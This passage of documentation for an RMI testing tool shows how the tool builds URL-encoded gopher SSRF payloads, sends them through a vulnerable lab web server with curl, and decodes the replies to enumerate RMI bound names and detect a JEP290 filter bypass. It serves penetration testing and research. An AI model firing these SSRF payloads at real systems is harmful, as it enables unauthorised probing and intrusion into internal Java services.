[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df

[qtc@devbox ~]$ curl 172.17.0.2:8000/?url=gopher%3A%2F%2F172.17.0.2%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2501%2544%2515%254d%25c9%25d4%25e6%253b%25df 2>/dev/null | xxd -p -c1000
4e00093132372e302e302e310000c48651aced0005770f01c95068b90000017d8947959b8008757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d69

[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf-response 4e00093132372e302e302e310000c48651aced0005770f01c95068b90000017d8947959b8008757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a617278700000000274000b46696c654d616e616765727400066a6d78726d69
[+] RMI registry bound names:
[+]
[+] 	- FileManager
[+] 	- jmxrmi
```

The ``--scan-action list`` action is limited to showing the available bound names when used without further arguments. By using
the ``--bound-name`` during the action, more detailed information can be obtained:

```console
[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf --gopher --encode --bound-name FileManager
[+] SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572

[qtc@devbox ~]$ curl 172.17.0.2:8000/?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2574%2500%250b%2546%2569%256c%2565%254d%2561%256e%2561%2567%2565%2572 2>/dev/null | xxd -p -c1000
4e00093132372e302e302e310000c48c51aced0005770f01c95068b90000017d8947959b800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f737400009077040fba7d4c453576c95068b90000017d8947959b80010178

[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --bound-name FileManager --ssrf-response 4e00093132372e302e302e310000c48c51aced0005770f01c95068b90000017d8947959b800a737d00000002000f6a6176612e726d692e52656d6f7465002764652e7174632e726d672e7365727665722e737372662e726d692e4946696c654d616e6167657274002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a6172787200176a6176612e6c616e672e7265666c6563742e50726f7879e127da20cc1043cb0200014c0001687400254c6a6176612f6c616e672f7265666c6563742f496e766f636174696f6e48616e646c65723b71007e000178707372002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c6572000000000000000202000071007e00017872001c6a6176612e726d692e7365727665722e52656d6f74654f626a656374d361b4910c61331e03000071007e000178707732000a556e696361737452656600096c6f63616c686f737400009077040fba7d4c453576c95068b90000017d8947959b80010178
[+] RMI registry bound names:
[+]
[+] 	- FileManager
[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManager (unknown class)
[+] 		    Endpoint: localhost:36983 ObjID: [-36af9747:17d8947959b:-7fff, 292657548115654006]
[+]
[+] RMI server codebase enumeration:
[+]
[+] 	- http://localhost:8000/rmi-class-definitions.jar
[+] 		--> de.qtc.rmg.server.ssrf.rmi.IFileManager
```

Apart from ``list`` the following scan actions are available:

* activator
* codebase
* filter-bypass
* jep290
* list
* localhost-bypass
* security-manager
* string-marshalling

The following output shows an example for the ``filter-bypass`` action:

```console
[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --ssrf --gopher --encode --scan-action filter-bypass
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	SSRF Payload: gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2532%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%2509%2531%2532%2537%252e%2530%252e%2530%252e%2531%2500%2512%25d6%2587%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578

[qtc@devbox ~]$ curl 172.17.0.2:8000/?url=gopher%3A%2F%2F127.0.0.1%3A1090%2F_%254a%2552%254d%2549%2500%2502%254b%2500%2509%2531%2532%2537%252e%2530%252e%2531%252e%2531%2500%2500%2500%2500%2550%25ac%25ed%2500%2505%2577%2522%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2502%2544%2515%254d%25c9%25d4%25e6%253b%25df%2573%2572%2500%2523%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2555%256e%2569%2563%2561%2573%2574%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2545%2509%2512%2515%25f5%25e2%257e%2531%2502%2500%2503%2549%2500%2504%2570%256f%2572%2574%254c%2500%2503%2563%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2543%256c%2569%2565%256e%2574%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%254c%2500%2503%2573%2573%2566%2574%2500%2528%254c%256a%2561%2576%2561%252f%2572%256d%2569%252f%2573%2565%2572%2576%2565%2572%252f%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%253b%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%2553%2565%2572%2576%2565%2572%25c7%2519%2507%2512%2568%25f3%2539%25fb%2502%2500%2500%2570%2578%2572%2500%251c%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%25d3%2561%25b4%2591%250c%2561%2533%251e%2503%2500%2500%2570%2578%2570%2577%2513%2500%2511%2555%256e%2569%2563%2561%2573%2574%2553%2565%2572%2576%2565%2572%2552%2565%2566%2532%2578%2500%2500%2500%2500%2570%2573%257d%2500%2500%2500%2502%2500%2526%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%254d%2549%2553%2565%2572%2576%2565%2572%2553%256f%2563%256b%2565%2574%2546%2561%2563%2574%256f%2572%2579%2500%250f%256a%2561%2576%2561%252e%2572%256d%2569%252e%2552%2565%256d%256f%2574%2565%2570%2578%2572%2500%2517%256a%2561%2576%2561%252e%256c%2561%256e%2567%252e%2572%2565%2566%256c%2565%2563%2574%252e%2550%2572%256f%2578%2579%25e1%2527%25da%2520%25cc%2510%2543%25cb%2502%2500%2501%254c%2500%2501%2568%2574%2500%2525%254c%256a%2561%2576%2561%252f%256c%2561%256e%2567%252f%2572%2565%2566%256c%2565%2563%2574%252f%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%253b%2570%2578%2570%2573%2572%2500%252d%256a%2561%2576%2561%252e%2572%256d%2569%252e%2573%2565%2572%2576%2565%2572%252e%2552%2565%256d%256f%2574%2565%254f%2562%256a%2565%2563%2574%2549%256e%2576%256f%2563%2561%2574%2569%256f%256e%2548%2561%256e%2564%256c%2565%2572%2500%2500%2500%2500%2500%2500%2500%2502%2502%2500%2500%2570%2578%2571%2500%257e%2500%2504%2577%2532%2500%250a%2555%256e%2569%2563%2561%2573%2574%2552%2565%2566%2500%2509%2531%2532%2537%252e%2530%252e%2530%252e%2531%2500%2512%25d6%2587%2500%2500%2500%2500%2500%2500%2500%257b%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2578 2>/dev/null | xxd -p -c10000
4e00093132372e302e302e310000c49651aced0005770f02c95068b90000017d8947959b800f737200226a6176612e6c616e672e496c6c6567616c417267756d656e74457863657074696f6eb58973d37d668fbc02000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e6c616e672e52756e74696d65457863657074696f6e9e5f06470a3483e502000071007e0001787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc402000071007e0001787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b71007e0001787071007e0009740019706f7274206f7574206f662072616e67653a313233343536377572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd223902000071007e000178700000002d7372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd85020008420006666f726d617449000a6c696e654e756d6265724c000f636c6173734c6f616465724e616d6571007e00064c000e6465636c6172696e67436c61737371007e00064c000866696c654e616d6571007e00064c000a6d6574686f644e616d6571007e00064c000a6d6f64756c654e616d6571007e00064c000d6d6f64756c6556657273696f6e71007e000671007e0001787002ffffffff7074001a6a6176612e6e65742e496e6574536f636b65744164647265737370740009636865636b506f72747400096a6176612e62617365740005392e302e347371007e000d02ffffffff7071007e000f707400063c696e69743e71007e001171007e00127371007e000d02ffffffff7074000f6a6176612e6e65742e536f636b65747071007e001471007e001171007e00127371007e000d010000001674000361707074003164652e7174632e726d672e7365727665722e737372662e726d692e4c6f63616c686f7374536f636b6574466163746f727974001b4c6f63616c686f7374536f636b6574466163746f72792e6a61766174000c637265617465536f636b657470707371007e000d02ffffffff7074002173756e2e726d692e7472616e73706f72742e7463702e544350456e64706f696e74707400096e6577536f636b65747400086a6176612e726d6971007e00127371007e000d02ffffffff7074002073756e2e726d692e7472616e73706f72742e7463702e5443504368616e6e656c70740010637265617465436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7071007e00217074000d6e6577436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7365727665722e556e696361737452656670740006696e766f6b6571007e001f71007e00127371007e000d02ffffffff7074002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657270740012696e766f6b6552656d6f74654d6574686f6471007e001f71007e00127371007e000d02ffffffff7071007e00297071007e002771007e001f71007e00127371007e000d01ffffffff740008706c6174666f726d740015636f6d2e73756e2e70726f78792e2450726f78793370740012637265617465536572766572536f636b657470707371007e000d02ffffffff7071007e001d7074000f6e6577536572766572536f636b657471007e001f71007e00127371007e000d02ffffffff7074002273756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f7274707400066c697374656e71007e001f71007e00127371007e000d02ffffffff7071007e00337074000c6578706f72744f626a65637471007e001f71007e00127371007e000d02ffffffff7071007e001d7071007e003671007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7472616e73706f72742e4c6976655265667071007e003671007e001f71007e00127371007e000d02ffffffff7074001f73756e2e726d692e7365727665722e556e69636173745365727665725265667071007e003671007e001f71007e00127371007e000d02ffffffff707400236a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a6563747071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7074000872656578706f727471007e001f71007e00127371007e000d02ffffffff7071007e003d7074000a726561644f626a65637471007e001f71007e00127371007e000d02fffffffe7074002d6a646b2e696e7465726e616c2e7265666c6563742e4e61746976654d6574686f644163636573736f72496d706c70740007696e766f6b653071007e001171007e00127371007e000d02ffffffff7071007e00447071007e002771007e001171007e00127371007e000d02ffffffff707400316a646b2e696e7465726e616c2e7265666c6563742e44656c65676174696e674d6574686f644163636573736f72496d706c7071007e002771007e001171007e00127371007e000d02ffffffff707400186a6176612e6c616e672e7265666c6563742e4d6574686f647071007e002771007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a65637453747265616d436c61737370740010696e766f6b65526561644f626a65637471007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a656374496e70757453747265616d7074000e7265616453657269616c4461746171007e001171007e00127371007e000d02ffffffff7071007e004f70740012726561644f7264696e6172794f626a65637471007e001171007e00127371007e000d02ffffffff7071007e004f7074000b726561644f626a6563743071007e001171007e00127371007e000d02ffffffff7071007e004f7071007e004271007e001171007e00127371007e000d02ffffffff7074002273756e2e726d692e72656769737472792e5265676973747279496d706c5f536b656c70740008646973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7074000b6f6c64446973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7071007e005871007e001f71007e00127371007e000d02ffffffff7074001d73756e2e726d692e7472616e73706f72742e5472616e73706f727424317074000372756e71007e001f71007e00127371007e000d02ffffffff7071007e005d7071007e005e71007e001f71007e00127371007e000d02fffffffe7074001e6a6176612e73656375726974792e416363657373436f6e74726f6c6c65727074000c646f50726976696c6567656471007e001171007e00127371007e000d02ffffffff7074001b73756e2e726d692e7472616e73706f72742e5472616e73706f72747074000b7365727669636543616c6c71007e001f71007e00127371007e000d02ffffffff7071007e00337074000e68616e646c654d6573736167657371007e001f71007e00127371007e000d02ffffffff7074003473756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f727424436f6e6e656374696f6e48616e646c65727074000472756e3071007e001f71007e00127371007e000d02ffffffff7071007e00697074000c6c616d6264612472756e243071007e001f71007e00127371007e000d02fffffffe7071007e00617071007e006271007e001171007e00127371007e000d02ffffffff7071007e00697071007e005e71007e001f71007e00127371007e000d02ffffffff707400276a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f727074000972756e576f726b657271007e001171007e00127371007e000d02ffffffff7074002e6a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f7224576f726b65727071007e005e71007e001171007e00127371007e000d02ffffffff707400106a6176612e6c616e672e5468726561647071007e005e71007e001171007e00127372001f6a6176612e7574696c2e436f6c6c656374696f6e7324456d7074794c6973747ab817b43ca79ede02000071007e0001787078

[qtc@devbox ~]$ rmg enum 127.0.0.1 1090 --scan-action filter-bypass --ssrf-response 4e00093132372e302e302e310000c49651aced0005770f02c95068b90000017d8947959b800f737200226a6176612e6c616e672e496c6c6567616c417267756d656e74457863657074696f6eb58973d37d668fbc02000074002f687474703a2f2f6c6f63616c686f73743a383030302f726d692d636c6173732d646566696e6974696f6e732e6a61727872001a6a6176612e6c616e672e52756e74696d65457863657074696f6e9e5f06470a3483e502000071007e0001787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc402000071007e0001787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b71007e0001787071007e0009740019706f7274206f7574206f662072616e67653a313233343536377572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd223902000071007e000178700000002d7372001b6a6176612e6c616e672e537461636b5472616365456c656d656e746109c59a2636dd85020008420006666f726d617449000a6c696e654e756d6265724c000f636c6173734c6f616465724e616d6571007e00064c000e6465636c6172696e67436c61737371007e00064c000866696c654e616d6571007e00064c000a6d6574686f644e616d6571007e00064c000a6d6f64756c654e616d6571007e00064c000d6d6f64756c6556657273696f6e71007e000671007e0001787002ffffffff7074001a6a6176612e6e65742e496e6574536f636b65744164647265737370740009636865636b506f72747400096a6176612e62617365740005392e302e347371007e000d02ffffffff7071007e000f707400063c696e69743e71007e001171007e00127371007e000d02ffffffff7074000f6a6176612e6e65742e536f636b65747071007e001471007e001171007e00127371007e000d010000001674000361707074003164652e7174632e726d672e7365727665722e737372662e726d692e4c6f63616c686f7374536f636b6574466163746f727974001b4c6f63616c686f7374536f636b6574466163746f72792e6a61766174000c637265617465536f636b657470707371007e000d02ffffffff7074002173756e2e726d692e7472616e73706f72742e7463702e544350456e64706f696e74707400096e6577536f636b65747400086a6176612e726d6971007e00127371007e000d02ffffffff7074002073756e2e726d692e7472616e73706f72742e7463702e5443504368616e6e656c70740010637265617465436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7071007e00217074000d6e6577436f6e6e656374696f6e71007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7365727665722e556e696361737452656670740006696e766f6b6571007e001f71007e00127371007e000d02ffffffff7074002d6a6176612e726d692e7365727665722e52656d6f74654f626a656374496e766f636174696f6e48616e646c657270740012696e766f6b6552656d6f74654d6574686f6471007e001f71007e00127371007e000d02ffffffff7071007e00297071007e002771007e001f71007e00127371007e000d01ffffffff740008706c6174666f726d740015636f6d2e73756e2e70726f78792e2450726f78793370740012637265617465536572766572536f636b657470707371007e000d02ffffffff7071007e001d7074000f6e6577536572766572536f636b657471007e001f71007e00127371007e000d02ffffffff7074002273756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f7274707400066c697374656e71007e001f71007e00127371007e000d02ffffffff7071007e00337074000c6578706f72744f626a65637471007e001f71007e00127371007e000d02ffffffff7071007e001d7071007e003671007e001f71007e00127371007e000d02ffffffff7074001973756e2e726d692e7472616e73706f72742e4c6976655265667071007e003671007e001f71007e00127371007e000d02ffffffff7074001f73756e2e726d692e7365727665722e556e69636173745365727665725265667071007e003671007e001f71007e00127371007e000d02ffffffff707400236a6176612e726d692e7365727665722e556e696361737452656d6f74654f626a6563747071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7071007e003671007e001f71007e00127371007e000d02ffffffff7071007e003d7074000872656578706f727471007e001f71007e00127371007e000d02ffffffff7071007e003d7074000a726561644f626a65637471007e001f71007e00127371007e000d02fffffffe7074002d6a646b2e696e7465726e616c2e7265666c6563742e4e61746976654d6574686f644163636573736f72496d706c70740007696e766f6b653071007e001171007e00127371007e000d02ffffffff7071007e00447071007e002771007e001171007e00127371007e000d02ffffffff707400316a646b2e696e7465726e616c2e7265666c6563742e44656c65676174696e674d6574686f644163636573736f72496d706c7071007e002771007e001171007e00127371007e000d02ffffffff707400186a6176612e6c616e672e7265666c6563742e4d6574686f647071007e002771007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a65637453747265616d436c61737370740010696e766f6b65526561644f626a65637471007e001171007e00127371007e000d02ffffffff707400196a6176612e696f2e4f626a656374496e70757453747265616d7074000e7265616453657269616c4461746171007e001171007e00127371007e000d02ffffffff7071007e004f70740012726561644f7264696e6172794f626a65637471007e001171007e00127371007e000d02ffffffff7071007e004f7074000b726561644f626a6563743071007e001171007e00127371007e000d02ffffffff7071007e004f7071007e004271007e001171007e00127371007e000d02ffffffff7074002273756e2e726d692e72656769737472792e5265676973747279496d706c5f536b656c70740008646973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7074000b6f6c64446973706174636871007e001f71007e00127371007e000d02ffffffff7071007e003b7071007e005871007e001f71007e00127371007e000d02ffffffff7074001d73756e2e726d692e7472616e73706f72742e5472616e73706f727424317074000372756e71007e001f71007e00127371007e000d02ffffffff7071007e005d7071007e005e71007e001f71007e00127371007e000d02fffffffe7074001e6a6176612e73656375726974792e416363657373436f6e74726f6c6c65727074000c646f50726976696c6567656471007e001171007e00127371007e000d02ffffffff7074001b73756e2e726d692e7472616e73706f72742e5472616e73706f72747074000b7365727669636543616c6c71007e001f71007e00127371007e000d02ffffffff7071007e00337074000e68616e646c654d6573736167657371007e001f71007e00127371007e000d02ffffffff7074003473756e2e726d692e7472616e73706f72742e7463702e5443505472616e73706f727424436f6e6e656374696f6e48616e646c65727074000472756e3071007e001f71007e00127371007e000d02ffffffff7071007e00697074000c6c616d6264612472756e243071007e001f71007e00127371007e000d02fffffffe7071007e00617071007e006271007e001171007e00127371007e000d02ffffffff7071007e00697071007e005e71007e001f71007e00127371007e000d02ffffffff707400276a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f727074000972756e576f726b657271007e001171007e00127371007e000d02ffffffff7074002e6a6176612e7574696c2e636f6e63757272656e742e546872656164506f6f6c4578656375746f7224576f726b65727071007e005e71007e001171007e00127371007e000d02ffffffff707400106a6176612e6c616e672e5468726561647071007e005e71007e001171007e00127372001f6a6176612e7574696c2e436f6c6c656374696f6e7324456d7074794c6973747ab817b43ca79ede02000071007e0001787078
[+] RMI registry JEP290 bypass enmeration:
[+]
[+] 	- Caught IllegalArgumentException after sending An Trinh gadget.
[+] 	  Vulnerability Status: Vulnerable
```

More examples for the ``--ssrf`` and ``--ssrf-response`` actions can be found in the documentation of the
[SSRF example server](/docker/ssrf-server) and the [Attacking Java RMI via SSRF blog post](https://blog.tneitzel.eu/posts/01-attacking-java-rmi-via-ssrf/).
